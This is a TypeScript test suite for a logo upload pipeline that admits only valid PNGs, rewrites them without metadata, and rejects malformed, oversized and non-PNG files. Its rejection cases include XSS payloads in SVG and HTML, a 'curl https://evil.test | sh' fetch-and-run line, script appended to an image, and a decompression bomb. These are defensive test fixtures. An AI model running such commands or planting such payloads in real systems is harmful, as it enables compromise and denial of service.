// The logo's safe media pipeline (CMD008-DENY "Unsafe SVG/script, invalid media or a foreign artifact reject"; S069 "hostile SVG,
// image bombs"): every image is synthetic and built here, byte by byte, so each refusal names exactly one defect of an otherwise valid PNG.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { test } from "node:test";
import { crc32, deflateSync } from "node:zlib";
import { LOGO_MAX_BYTES, LOGO_MAX_PIXELS, admitLogo, decodeAdmittedPng, encodePng } from "../src/model/branding.js";

const SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function chunk(type: string, data: Uint8Array, badCrc = false): Buffer {
  const out = Buffer.alloc(12 + data.length);
  out.writeUInt32BE(data.length, 0);
  out.write(type, 4, "latin1");
  out.set(data, 8);
  out.writeUInt32BE((crc32(out.subarray(4, 8 + data.length)) ^ (badCrc ? 1 : 0)) >>> 0, 8 + data.length);
  return out;
}

function ihdr(width: number, height: number, bitDepth = 8, colorType = 6, interlace = 0): Buffer {
  const b = Buffer.alloc(13);
  b.writeUInt32BE(width, 0);
  b.writeUInt32BE(height, 4);
  b[8] = bitDepth;
  b[9] = colorType;
  b[12] = interlace;
  return b;
}

/** A width x height RGBA8 image whose pixel (x, y) is (x, y, x ^ y, 200 + (x % 2) * 55), filter 0 on every line. */
function rgbaPixels(width: number, height: number): Uint8Array {
  const px = new Uint8Array(width * height * 4);
  for (let y = 0; y < height; y++) for (let x = 0; x < width; x++) px.set([x & 0xff, y & 0xff, (x ^ y) & 0xff, 200 + (x % 2) * 55], (y * width + x) * 4);
  return px;
}
function rawLines(width: number, height: number, bytesPerPixel: number, pixels: Uint8Array): Buffer {
  const stride = width * bytesPerPixel;
  const raw = Buffer.alloc((stride + 1) * height);
  for (let y = 0; y < height; y++) raw.set(pixels.subarray(y * stride, (y + 1) * stride), y * (stride + 1) + 1);
  return raw;
}
function png(parts: readonly Buffer[]): Buffer {
  return Buffer.concat([SIGNATURE, ...parts]);
}
const IEND = chunk("IEND", new Uint8Array(0));
function rgbaPng(width = 7, height = 5, extra: readonly Buffer[] = []): Buffer {
  return png([chunk("IHDR", ihdr(width, height)), ...extra, chunk("IDAT", deflateSync(rawLines(width, height, 4, rgbaPixels(width, height)))), IEND]);
}

const problemOf = (bytes: Uint8Array): string => {
  const r = admitLogo(bytes);
  return r.ok ? "OK" : r.problem;
};

test("CMD008-OK media: a valid PNG is admitted as the platform's own PNG of the same pixels — metadata dropped, named by its SHA-256", () => {
  const upload = rgbaPng(7, 5, [chunk("tEXt", Buffer.from("Author\0someone@example.test")), chunk("eXIf", Buffer.from("MM\0*private"))]);
  const r = admitLogo(upload);
  assert.ok(r.ok);
  assert.equal(r.logo.mediaType, "image/png");
  assert.deepEqual([r.logo.width, r.logo.height], [7, 5]);
  assert.equal(r.logo.sha256, createHash("sha256").update(r.logo.bytes).digest("hex"));
  assert.notDeepEqual(Buffer.from(r.logo.bytes), upload, "the stored bytes are written again, not the upload's");
  const text = Buffer.from(r.logo.bytes).toString("latin1");
  assert.ok(!text.includes("tEXt") && !text.includes("eXIf") && !text.includes("someone@example.test"), "no metadata survives");
  assert.deepEqual(decodeAdmittedPng(r.logo.bytes).rgba, rgbaPixels(7, 5), "the pixels are the upload's");
  // admitting the platform's PNG again is the same PNG (the pipeline is a fixed point)
  const again = admitLogo(r.logo.bytes);
  assert.ok(again.ok);
  assert.equal(again.logo.sha256, r.logo.sha256);
});

test("CMD008-OK media: palette with transparency, low bit depths, greyscale with alpha, 16-bit and interlaced images decode to the same pixels as their plain RGBA form", () => {
  // a 2-bit palette image with tRNS: 5x3 pixels, index (x + y) % 4
  const palette = Buffer.from([255, 0, 0, 0, 255, 0, 0, 0, 255, 10, 20, 30]);
  const trns = Buffer.from([255, 128, 0]);
  const width = 5;
  const height = 3;
  const raw = Buffer.alloc((Math.ceil((width * 2) / 8) + 1) * height);
  const expected = new Uint8Array(width * height * 4);
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      const i = (x + y) % 4;
      const at = y * 3 + 1 + Math.floor(x / 4);
      raw[at] = (raw[at] as number) | (i << (6 - 2 * (x % 4)));
      expected.set([palette[i * 3]!, palette[i * 3 + 1]!, palette[i * 3 + 2]!, i < 3 ? trns[i]! : 255], (y * width + x) * 4);
    }
  }
  const indexed = admitLogo(png([chunk("IHDR", ihdr(width, height, 2, 3)), chunk("PLTE", palette), chunk("tRNS", trns), chunk("IDAT", deflateSync(raw)), IEND]));
  assert.ok(indexed.ok, indexed.ok ? "" : indexed.detail);
  assert.deepEqual(decodeAdmittedPng(indexed.logo.bytes).rgba, expected);

  // 16-bit RGBA: each sample's high byte is the 8-bit image's
  const px = rgbaPixels(4, 4);
  const wide = Buffer.alloc(px.length * 2);
  px.forEach((v, i) => wide.writeUInt16BE(v * 257, i * 2));
  const deep = admitLogo(png([chunk("IHDR", ihdr(4, 4, 16, 6)), chunk("IDAT", deflateSync(rawLines(4, 4, 8, wide))), IEND]));
  assert.ok(deep.ok);
  assert.deepEqual(decodeAdmittedPng(deep.logo.bytes).rgba, px);

  // the platform's own interlaced writing of an image decodes to the same pixels (Adam7)
  const plain = encodePng(9, 9, rgbaPixels(9, 9));
  assert.deepEqual(decodeAdmittedPng(plain).rgba, rgbaPixels(9, 9));
  const passes: Buffer[] = [];
  const all = rgbaPixels(9, 9);
  for (const [x0, y0, dx, dy] of [[0, 0, 8, 8], [4, 0, 8, 8], [0, 4, 4, 8], [2, 0, 4, 4], [0, 2, 2, 4], [1, 0, 2, 2], [0, 1, 1, 2]] as const) {
    for (let y = y0; y < 9; y += dy) {
      const line: number[] = [0];
      for (let x = x0; x < 9; x += dx) line.push(...all.subarray((y * 9 + x) * 4, (y * 9 + x) * 4 + 4));
      if (line.length > 1) passes.push(Buffer.from(line));
    }
  }
  const interlaced = admitLogo(png([chunk("IHDR", ihdr(9, 9, 8, 6, 1)), chunk("IDAT", deflateSync(Buffer.concat(passes))), IEND]));
  assert.ok(interlaced.ok, interlaced.ok ? "" : interlaced.detail);
  assert.deepEqual(decodeAdmittedPng(interlaced.logo.bytes).rgba, all);

  // greyscale + alpha at 8 bits, 2x2: each line is a filter byte and two (grey, alpha) pairs
  const lines = Buffer.from([0, 10, 255, 20, 128, 0, 30, 0, 40, 255]);
  const grey = admitLogo(png([chunk("IHDR", ihdr(2, 2, 8, 4)), chunk("IDAT", deflateSync(lines)), IEND]));
  assert.ok(grey.ok);
  assert.deepEqual([...decodeAdmittedPng(grey.logo.bytes).rgba], [10, 10, 10, 255, 20, 20, 20, 128, 30, 30, 30, 0, 40, 40, 40, 255]);
});

test("CMD008-DENY media: SVG, HTML, script, JPEG, GIF, WebP, a renamed text file and an empty file are refused at the signature, nothing parsed", () => {
  const cases: ReadonlyArray<readonly [string, Uint8Array]> = [
    ["svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch("https://evil.test")</script></svg>')],
    ["svg with BOM and whitespace", Buffer.from('﻿  \n<?xml version="1.0"?><svg/>')],
    ["html", Buffer.from("<!doctype html><img src=x onerror=alert(1)>")],
    ["script", Buffer.from("#!/bin/sh\ncurl https://evil.test | sh\n")],
    ["jpeg", Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0xff, 0xd9])],
    ["gif", Buffer.from("GIF89a\x01\x00\x01\x00\x00\x00\x00;", "latin1")],
    ["webp", Buffer.from("RIFF\x1a\x00\x00\x00WEBPVP8 ", "latin1")],
    ["a url", Buffer.from("https://cdn.example.test/logo.png")],
    ["empty", new Uint8Array(0)],
  ];
  for (const [name, bytes] of cases) assert.equal(problemOf(bytes), "LOGO_FORMAT_UNSUPPORTED", name);
  const jpeg = admitLogo(cases[4]![1]);
  assert.ok(!jpeg.ok && /JPEG/.test(jpeg.detail));
  // a PNG signature in front of markup is still not a PNG
  assert.equal(problemOf(Buffer.concat([SIGNATURE, Buffer.from("<svg/>")])), "LOGO_MALFORMED");
});

test("CMD008-DENY media: a forged or broken PNG is refused — each defect alone", () => {
  const good = rgbaPng();
  assert.equal(problemOf(good), "OK");
  const idat = chunk("IDAT", deflateSync(rawLines(7, 5, 4, rgbaPixels(7, 5))));
  const head = chunk("IHDR", ihdr(7, 5));
  const cases: ReadonlyArray<readonly [string, Uint8Array]> = [
    ["truncated", good.subarray(0, good.length - 20)],
    ["bad CRC", png([chunk("IHDR", ihdr(7, 5), true), idat, IEND])],
    ["IDAT CRC", png([head, chunk("IDAT", deflateSync(rawLines(7, 5, 4, rgbaPixels(7, 5))), true), IEND])],
    ["no IHDR first", png([idat, head, IEND])],
    ["two IHDR", png([head, head, idat, IEND])],
    ["no IEND", png([head, idat])],
    ["bytes after IEND", Buffer.concat([good, Buffer.from("<script>alert(1)</script>")])],
    ["IEND with data", png([head, idat, chunk("IEND", Buffer.from("x"))])],
    ["no image data", png([head, IEND])],
    ["split image data", png([head, chunk("IDAT", Buffer.alloc(0)), chunk("tEXt", Buffer.from("a\0b")), idat, IEND])],
    ["unknown critical chunk", png([head, chunk("ZZZZ", Buffer.alloc(1)), idat, IEND])],
    ["chunk type not letters", png([head, chunk("ab1d", Buffer.alloc(1)), idat, IEND])],
    ["bad bit depth", png([chunk("IHDR", ihdr(7, 5, 7, 6)), idat, IEND])],
    ["bad colour type", png([chunk("IHDR", ihdr(7, 5, 8, 5)), idat, IEND])],
    ["unknown filter method", png([chunk("IHDR", (() => { const b = ihdr(7, 5); b[11] = 1; return b; })()), idat, IEND])],
    ["short image data", png([head, chunk("IDAT", deflateSync(rawLines(7, 4, 4, rgbaPixels(7, 4)))), IEND])],
    ["long image data", png([head, chunk("IDAT", deflateSync(rawLines(7, 6, 4, rgbaPixels(7, 6)))), IEND])],
    ["not deflate", png([head, chunk("IDAT", Buffer.from("not a zlib stream at all")), IEND])],
    // review BR-001: the stream must end and be the whole image data — no missing Adler-32, no unfinished DEFLATE, nothing after it
    ["zlib stream without its Adler-32", png([head, chunk("IDAT", deflateSync(rawLines(7, 5, 4, rgbaPixels(7, 5))).subarray(0, -4)), IEND])],
    ["unfinished DEFLATE stream", png([head, chunk("IDAT", deflateSync(rawLines(7, 5, 4, rgbaPixels(7, 5))).subarray(0, -9)), IEND])],
    ["data after the zlib stream", png([head, chunk("IDAT", Buffer.concat([deflateSync(rawLines(7, 5, 4, rgbaPixels(7, 5))), Buffer.from("<svg/>")])), IEND])],
    ["the reviewer's 1x1 PNG without its Adler-32", Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAACElEQVR4nGP4z8AAAPAwxZIAAAAASUVORK5CYII=", "base64")],
    ["bad scanline filter", png([head, chunk("IDAT", deflateSync((() => { const r = rawLines(7, 5, 4, rgbaPixels(7, 5)); r[0] = 9; return r; })())), IEND])],
    ["indexed without palette", png([chunk("IHDR", ihdr(2, 2, 8, 3)), chunk("IDAT", deflateSync(Buffer.from([0, 0, 0, 0, 0, 0]))), IEND])],
    ["palette index out of range", png([chunk("IHDR", ihdr(2, 2, 8, 3)), chunk("PLTE", Buffer.from([1, 2, 3])), chunk("IDAT", deflateSync(Buffer.from([0, 0, 1, 0, 0, 0]))), IEND])],
    ["palette in greyscale", png([chunk("IHDR", ihdr(2, 2, 8, 0)), chunk("PLTE", Buffer.from([1, 2, 3])), chunk("IDAT", deflateSync(Buffer.alloc(6))), IEND])],
    ["tRNS with alpha", png([head, chunk("tRNS", Buffer.from([0, 0])), idat, IEND])],
  ];
  for (const [name, bytes] of cases) assert.equal(problemOf(bytes), "LOGO_MALFORMED", name);
  assert.equal(problemOf(png([head, chunk("acTL", Buffer.alloc(8)), idat, IEND])), "LOGO_FORMAT_UNSUPPORTED", "animated");
});

test("CMD008-OK media (review BR-002): a tRNS key is compared at the image's bit depth — its unused high bits masked — for greyscale at 1, 2, 4, 8 and 16 bits and for truecolour at 8 and 16 bits; each expected pixel is written out by hand", () => {
  // the reviewer's 1x1 greyscale-8 PNG: pixel 0, tRNS key 0x0100 — masked to eight bits the key is 0, so the pixel is transparent
  const reviewer = admitLogo(Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAAAnRSTlMBAG+I/HkAAAAKSURBVHicY2AAAAACAAFIr6RxAAAAAElFTkSuQmCC", "base64"));
  assert.ok(reviewer.ok, reviewer.ok ? "" : reviewer.detail);
  assert.deepEqual([...decodeAdmittedPng(reviewer.logo.bytes).rgba], [0, 0, 0, 0]);
  const key = (...values: number[]): Buffer => Buffer.concat(values.map((v) => { const b = Buffer.alloc(2); b.writeUInt16BE(v); return b; }));
  // greyscale, 2 pixels per image: [the key value, another value]; the key carries garbage in its unused high bits
  const grey: ReadonlyArray<readonly [number, Buffer, number, readonly number[]]> = [
    // depth, the one scanline (filter byte, samples), the tRNS key as stored, the expected RGBA of the two pixels
    [1, Buffer.from([0, 0b1000_0000]), 0xfffe, [255, 255, 255, 255, 0, 0, 0, 0]],
    [2, Buffer.from([0, 0b0111_0000]), 0xab03, [85, 85, 85, 255, 255, 255, 255, 0]],
    [4, Buffer.from([0, 0x5a]), 0x705a & 0xff0f, [85, 85, 85, 255, 170, 170, 170, 0]],
    [8, Buffer.from([0, 7, 9]), 0x0109, [7, 7, 7, 255, 9, 9, 9, 0]],
    [16, Buffer.from([0, 0x01, 0x09, 0x00, 0x09]), 0x0009, [1, 1, 1, 255, 0, 0, 0, 0]],
  ];
  for (const [depth, line, k, expected] of grey) {
    const r = admitLogo(png([chunk("IHDR", ihdr(2, 1, depth, 0)), chunk("tRNS", key(k)), chunk("IDAT", deflateSync(line)), IEND]));
    assert.ok(r.ok, `grey ${depth}: ${r.ok ? "" : r.detail}`);
    assert.deepEqual([...decodeAdmittedPng(r.logo.bytes).rgba], expected, `greyscale at ${depth} bits`);
  }
  // truecolour: pixel 1 is the key, pixel 2 differs in its blue sample only
  const rgb8 = admitLogo(png([chunk("IHDR", ihdr(2, 1, 8, 2)), chunk("tRNS", key(0xff10, 0x0020, 0x7f30)), chunk("IDAT", deflateSync(Buffer.from([0, 0x10, 0x20, 0x30, 0x10, 0x20, 0x31]))), IEND]));
  assert.ok(rgb8.ok);
  assert.deepEqual([...decodeAdmittedPng(rgb8.logo.bytes).rgba], [0x10, 0x20, 0x30, 0, 0x10, 0x20, 0x31, 255], "truecolour at 8 bits");
  const rgb16 = admitLogo(png([chunk("IHDR", ihdr(2, 1, 16, 2)), chunk("tRNS", key(0x1001, 0x2002, 0x3003)), chunk("IDAT", deflateSync(Buffer.from([0, 0x10, 0x01, 0x20, 0x02, 0x30, 0x03, 0x10, 0x01, 0x20, 0x02, 0x30, 0x04]))), IEND]));
  assert.ok(rgb16.ok);
  assert.deepEqual([...decodeAdmittedPng(rgb16.logo.bytes).rgba], [0x10, 0x20, 0x30, 0, 0x10, 0x20, 0x30, 255], "truecolour at 16 bits: all sixteen bits compared, the high byte kept");
});

test("CMD008-DENY media: excessive images — too many bytes, too many pixels a side, zero pixels, and a decompression bomb — are refused before any allocation beyond their bound", () => {
  assert.equal(problemOf(Buffer.alloc(LOGO_MAX_BYTES + 1)), "LOGO_TOO_LARGE");
  assert.equal(problemOf(Buffer.concat([rgbaPng(), Buffer.alloc(LOGO_MAX_BYTES)])), "LOGO_TOO_LARGE", "the size is judged before anything parses the bytes");
  const tiny = deflateSync(Buffer.alloc(10));
  assert.equal(problemOf(png([chunk("IHDR", ihdr(LOGO_MAX_PIXELS + 1, 1)), chunk("IDAT", tiny), IEND])), "LOGO_DIMENSIONS_OUT_OF_RANGE");
  assert.equal(problemOf(png([chunk("IHDR", ihdr(1, 100_000)), chunk("IDAT", tiny), IEND])), "LOGO_DIMENSIONS_OUT_OF_RANGE");
  assert.equal(problemOf(png([chunk("IHDR", ihdr(0, 5)), chunk("IDAT", tiny), IEND])), "LOGO_DIMENSIONS_OUT_OF_RANGE");
  // a bomb: a 1x1 header over ~200 MiB of zeros compressed to ~200 KiB; inflation stops at the 5 bytes the header implies
  const bomb = deflateSync(Buffer.alloc(200 * 1024 * 1024), { level: 9 });
  assert.ok(bomb.length < LOGO_MAX_BYTES);
  const started = process.hrtime.bigint();
  assert.equal(problemOf(png([chunk("IHDR", ihdr(1, 1)), chunk("IDAT", bomb), IEND])), "LOGO_MALFORMED");
  assert.ok(process.hrtime.bigint() - started < 2_000_000_000n, "the bomb is refused at its bound, not after inflating it");
  // the largest admitted side is admitted
  const edge = admitLogo(png([chunk("IHDR", ihdr(LOGO_MAX_PIXELS, 1, 8, 0)), chunk("IDAT", deflateSync(Buffer.alloc(LOGO_MAX_PIXELS + 1))), IEND]));
  assert.ok(edge.ok);
  // review BR-003: an upload under the bound whose pixels, written again as RGB, are not — the output fence, not the input one, refuses it.
  // A 700x700 indexed image of pseudo-random indices into 256 pseudo-random colours: one byte a pixel in, three out.
  const side = 700;
  let s = 1;
  const next = (): number => (s = (Math.imul(s, 1103515245) + 12345) >>> 0) >>> 24;
  const palette = Buffer.alloc(256 * 3);
  for (let k = 0; k < palette.length; k++) palette[k] = next();
  const indexed = rawLines(side, side, 1, Uint8Array.from({ length: side * side }, next));
  const upload = png([chunk("IHDR", ihdr(side, side, 8, 3)), chunk("PLTE", palette), chunk("IDAT", deflateSync(indexed, { level: 9 })), IEND]);
  assert.ok(upload.length < LOGO_MAX_BYTES, `the upload is under the bound (${upload.length} bytes)`);
  const rewritten = encodePng(side, side, decodeAdmittedPng(upload).rgba);
  assert.ok(rewritten.length > LOGO_MAX_BYTES, `its pixels written again are over it (${rewritten.length} bytes)`);
  const refusedOutput = admitLogo(upload);
  assert.ok(!refusedOutput.ok && refusedOutput.problem === "LOGO_TOO_LARGE" && /written again/.test(refusedOutput.detail), "refused by the output fence");
});
